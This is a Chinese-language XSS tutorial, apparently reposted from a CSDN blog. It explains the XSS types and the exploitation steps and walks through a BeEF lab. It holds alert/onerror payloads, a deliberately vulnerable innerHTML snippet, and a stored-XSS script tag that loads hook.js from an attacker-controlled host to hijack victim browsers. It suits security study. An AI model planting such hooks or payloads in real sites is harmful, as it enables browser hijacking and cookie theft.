# XSS


## 0x1 简介

**跨站脚本**（cross site script）为了避免与样式css混淆，所以简称为XSS,是web中最主流的攻击方式。
XSS 攻击指黑客通过特殊的手段往网页中插入了恶意的 JavaScript 脚本，从而在用户浏览网页时，对用户浏览器发起 Cookie 资料窃取、会话劫持、钓鱼欺骗等各攻击。

XSS 跨站脚本攻击本身对 Web 服务器没有直接危害，它借助网站进行传播，使网站的大量用户受到攻击。攻击者一般通过留言、电子邮件或其他途径向受害者发送一个精心构造的恶意 URL，当受害者在 Web 浏览器中打开该URL的时侯，恶意脚本会在受害者的计算机上悄悄执行。

**XSS漏洞普遍流行的原因:**

```
Web 浏览器本身的设计不安全，无法判断 JS 代码是否是恶意的
输入与输出的 Web 应用程序基本交互防护不够
程序员缺乏安全意识，缺少对 XSS 漏洞的认知
XSS 触发简单，完全防御起来相当困难 
```

**XSS攻击的危害:**

```
网络钓鱼
盗取用户 cookies 信息
劫持用户浏览器
强制弹出广告页面、刷流量
网页挂马
进行恶意操作，例如任意篡改页面信息
获取客户端隐私信息
控制受害者机器向其他网站发起攻击
结合其他漏洞，如 CSRF 漏洞，实施进一步作恶
提升用户权限，包括进一步渗透网站
传播跨站脚本蠕虫等
```

## 0x2 跨站脚本实例

下面的 HTML 代码就演示了一个最基本的 XSS 弹窗：

```
<html>
<body>

  <script>alert(1)</script>

</body>
</html>
```

## 0x3 分类

#### (1)反射型XSS（非持久型）

反射型XSS只是简单的把用户输入的数据从服务器反射给用户浏览器，要利用这个漏洞，攻击者必须以某种方式诱导用户访问一个精心设计的URL（恶意链接），才能实施攻击。

##### 漏洞成因

当用户的输入或者一些用户可控参数未经处理地输出到页面上，就容易产生XSS漏洞。主要场景有以下几种：

```
将不可信数据插入到HTML标签之间时；// 例如div, p, td；
将不可信数据插入到HTML属性里时；// 例如：<div width=$INPUT></div>
将不可信数据插入到SCRIPT里时；// 例如：<script>var message = ” $INPUT “;</script>
还有插入到Style属性里的情况，同样具有一定的危害性；// 例如<span style=” property : $INPUT ”></span>
将不可信数据插入到HTML URL里时，// 例如：<a href=”[http://www.abcd.com?param=](http://www.ccc.com/?param=) $INPUT ”></a>
使用富文本时，没有使用XSS规则引擎进行编码过滤。
```

##### 攻击流程

反射型XSS通常出现在搜索等功能中，需要被攻击者点击对应的链接才能触发，且受到XSS Auditor(chrome内置的XSS保护)、NoScript等防御手段的影响较大，所以它的危害性较存储型要小。

![image-20230511010637671](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511010637671.png)

#### (2)存储型XSS（持久型）

##### 漏洞成因

存储型XSS漏洞的成因与反射型的根源类似，不同的是恶意代码会被保存在服务器中，导致其它用户（前端）和管理员（前后端）在访问资源时执行了恶意代码，用户访问服务器-跨站链接-返回跨站代码。

##### 攻击流程

![image-20230511010807248](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511010807248.png)

#### (3)DOM型XSS

输入的恶意代码不会经过服务器，在前端被js代码直接读取放置到前端的标签中，是一 种特殊的反射型XSS。

##### 漏洞成因

DOM型XSS是基于DOM文档对象模型的。对于浏览器来说，DOM文档就是一份XML文档，当有了这个标准的技术之后，通过JavaScript就可以轻松的访问DOM。当确认客户端代码中有DOM型XSS漏洞时，诱使(钓鱼)一名用户访问自己构造的URL，利用步骤和反射型很类似，但是唯一的区别就是，构造的URL参数不用发送到服务器端，可以达到绕过WAF、躲避服务端的检测效果。
下面编写一个简单的含有 DOM XSS漏洞的 HTML 代码：

```

<meta charset="UTF-8">


<script>
    function xss(){
        var str = document.getElementById("src").value;
        document.getElementById("demo").innerHTML = "<img src='"+str+"' />";
    }
</script>

<input type="text" id="src" size="50" placeholder="输入图片地址" />
<input type="button" value="插入" onclick="xss()" /><br>

<div id="demo" ></div>
```

用户输入框插入图片地址后，页面会将图片插入在id=“demo” 的 div 标签中，从而显示在网页上：

![image-20230511011033557](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511011033557.png)

同样，这里也没有对用户的输入进入过滤，当攻击者构造如下语句插入的时候：

```
<img src="1" onerror="alert(1)">
```

![image-20230511011114675](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511011114675.png)

会直接在img标签中插入onerror事件，该语句表示当图片加载出错的时候，自动触发后面的 alert()函数，来达到弹窗的效果，这就是一个最简单的 DOM 型 XSS 漏洞。

#### (4)通用型XSS

通用型XSS，也叫做UXSS或者Universal XSS，全称Universal Cross-Site Scripting。

上面三种XSS攻击的是因为客户端或服务端的代码开发不严谨等问题而存在漏洞的目标网站或者应用程序。这些攻击的先决条件是访问页面存在漏洞，但是UXSS是一种利用浏览器或者浏览器扩展漏洞来制造产生XSS的条件并执行代码的一种攻击类型。


##### 漏洞成因

Web浏览器是正在使用的最流行的应用程序之一，当一个新漏洞被发现的时候，不管自己利用还是说报告给官方，而这个过程中都有一段不小的时间，这一过程中漏洞都可能被利用于UXSS。

不仅是浏览器本身的漏洞，现在主流浏览器都支持扩展程序的安装，而众多的浏览器扩展程序可能导致带来更多的漏洞和安全问题。因为UXSS攻击不需要网站页面本身存在漏洞，同时可能访问其他安全无漏洞页面，使得UXSS成为XSS里危险和最具破坏性的攻击类型之一。

##### 漏洞案例

IE6或火狐浏览器扩展程序Adobe Acrobat的漏洞

这是一个比较经典的例子。当使用扩展程序时导致错误，使得代码可以执行。这是一个在pdf阅读器中的bug，允许攻击者在客户端执行脚本。构造恶意页面，写入恶意脚本，并利用扩展程序打开pdf时运行代码。tefano Di Paola 和 Giorgio Fedon在一个在Mozilla Firefox浏览器Adobe Reader的插件中可利用的缺陷中第一个记录和描述的UXSS，Adobe插件通过一系列参数允许从外部数据源取数据进行文档表单的填充，如果没有正确的执行，将允许跨站脚本攻击。

#### (5)突变型XSS

突变型XSS，也叫做mXSS或，全称Mutation-based Cross-Site-Scripting。（mutation，突变，来自遗传学的一个单词，大家都知道的基因突变，gene mutation）

##### 漏洞成因

然而，如果用户所提供的富文本内容通过javascript代码进入innerHTML属性后，一些意外的变化会使得这个认定不再成立：浏览器的渲染引擎会将本来没有任何危害的HTML代码渲染成具有潜在危险的XSS攻击代码。

随后，该段攻击代码，可能会被JS代码中的其它一些流程输出到DOM中或是其它方式被再次渲染，从而导致XSS的执行。 这种由于HTML内容进入innerHTML后发生意外变化，而最终导致XSS的攻击流程。

##### 攻击流程

 将拼接的内容置于innerHTML这种操作，在现在的WEB应用代码中十分常见，常见的WEB应用中很多都使用了innerHTML属性，这将会导致潜在的mXSS攻击。从浏览器角度来讲，mXSS对三大主流浏览器（IE，CHROME，FIREFOX）均有影响。

## 0x4 利用流程

```
1.找注入点
	找到数据输入的地方

2.判断回显位置---输入的数据在什么地方输出
	如果输入的数据能够在前端进行输出，则可以证明输入的前段恶意代码在没有安全性处理的情 况下能够输出前端，从而造成风险

3.构造基础的payload

4.进行提交payload 

5.分析响应状况
	1. 如果成功解析则XSS存在
	2. 反之考虑绕过

6.确认漏洞
	如果响应达到了预期，则说明漏洞存在，反之不存在。
```

## 0x5 难度

高危漏洞但漏洞库不一定接受此漏洞，存储型XSS肯定被接受

```
1.反射型攻击难度较高
	1.如何发送含有payload的连接呢---社工------效率很低
	2. 影响面较小

2.存储型XSS攻击难度较小
	1.攻击者将恶意代码写入数据库，只要访问该网站的用户必定中招。
```

## 0x6 防御

```
1.过滤---将关键的字符过滤掉

2. 实体化编码
   1.将特殊字符转换成字符串
```

## 0x7自动化XSS

### BeEF简介

Browser Exploitation Framework (BeEF) BeEF是目前最强大的浏览器开源渗透测试框架，通过XSS漏洞配合JS脚本和Metasploit进行渗透； BeEF是基于Ruby语言编写的，并且支持图形化界面，操作简单。

```
http://beefproject.com/
```

#### **信息收集**：

1. 网络发现
2. 主机信息
3. Cookie获取 4. 会话劫持
4. 键盘记录
5. 插件信息

#### **持久化控制**:

1. 确认弹框
2. 小窗口
3. 中间人

#### **社会工程**：

1. 点击劫持
2. 弹窗告警
3. 虚假页面
4. 钓鱼页面

#### **渗透攻击**：

1. 内网渗透
2. Metasploit
3. CSRF攻击
4. DDOS攻击

### BeEF基础

```
启动Apache和BeEF:
root@kali:~# service apache2 start
```

![image-20230511012003975](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012003975.png)

![image-20230511012040339](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012040339.png)

![image-20230511012057736](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012057736.png)

```
<script src="http://192.168.106.140:3000/hook.js"></script>
注：192.168.106.140为BeEF所在机器，即Kali Linux IP
```

```
登录BeEF: 
username: beef 
password: beef
```

![image-20230511012200754](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012200754.png)

![image-20230511012222723](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012222723.png)

![image-20230511012242056](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012242056.png)

```
渗透机将脚本放在DWVA靶机中：
<script src="http://192.168.106.140:3000/hook.js"></script>
注：192.168.106.140为BeEF所在机器，即Kali Linux IP
注：需修改字符数的限制，例如为200
```

![image-20230511012309967](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012309967.png)

```
肉机Win7 访问XSS stored页面
```

![image-20230511012338936](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012338936.png)

BeEF页面查看肉鸡是否上线

![image-20230511012354899](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012354899.png)

### 信息收集

![image-20230511012426644](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012426644.png)

```
命令颜色(Color):
绿色  对目标主机生效并且不可见（不会被发现） 
橙色  对目标主机生效但可能可见（可能被发现） 
灰色  对目标主机未必生效（可验证下）
红色  对目标主机不生效
```

![image-20230511012459413](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230511012459413.png)

这篇博客是从CSDN上扒下来的，借着护网面试的缘由，复习了一下

本文链接：https://blog.csdn.net/weixin_53002381/article/details/126017006
